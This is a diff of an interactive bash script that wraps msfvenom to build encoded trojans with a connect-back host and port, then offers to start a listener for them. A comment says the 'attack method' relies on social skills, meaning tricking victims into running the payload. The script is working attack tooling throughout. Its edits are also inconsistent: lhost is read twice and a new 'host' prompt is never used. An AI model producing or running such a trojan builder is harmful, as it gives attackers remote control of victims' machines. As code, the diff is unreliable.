@@ -3,30 +3,43 @@
 #You must have good social skills to use this attack method successfully 
 clear
 cat banners/banner1
+echo "------------------------------------------------------------------------------------------"
+echo 'payload: ' 
 cd payload
+read -e payload 
 echo "------------------------------------------------------------------------------------------"
-echo 'payload: '
-read -r -e payload
+echo "Please enter IP Adress of the device to bind to the listener to" 
+echo "Leave blank if you don't plan to start a listener after"
+echo "Getting Current interface IP Adresses"
+echo "************ "
+ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+echo "************"
+read lhost
 echo "------------------------------------------------------------------------------------------"
-echo "Getting Current WAN IP"
-echo "Your WAN IP is" && wget -qO- ifconfig.co
-echo 'lhost: '
-read -r -e lhost
+printf 'Your WAN IP is: ' && wget -qO- ifconfig.co
+echo "Please enter the Host for the trojan to connect back to:"
+read host
 echo "------------------------------------------------------------------------------------------"
 echo 'lport: '
-read -r -e lport
+read -e lport
 echo "------------------------------------------------------------------------------------------"
-echo 'encoder: ' && cd ../encoder
-read -r -e encoder
+echo 'lhost: '
+read lhost
+echo "------------------------------------------------------------------------------------------"
+echo 'encoder: ' 
+cd ../encoder
+read -e encoder
 echo "------------------------------------------------------------------------------------------"
 echo 'ittirations: '
-read -r -e itirations
+read -e itirations
 echo "------------------------------------------------------------------------------------------"
-echo 'format: ' && cd ../format
-read -r -e format 
+echo 'format: '
+cd ../format
+read -e format 
 echo "------------------------------------------------------------------------------------------"
-echo 'output: ' && cd ../
-read -r -e output
+echo 'output: ' 
+cd ../
+read -e output
 msfvenom -p $payload lhost=$lhost lport=$lport -e $encoder -i $itirations -f $format -o $output
 
 echo "Would you like to start a listener for your newly generated trojan?"
@@ -36,4 +49,3 @@ select yn in "Yes" "No"; do
         No ) exit;;
     esac
 done
-
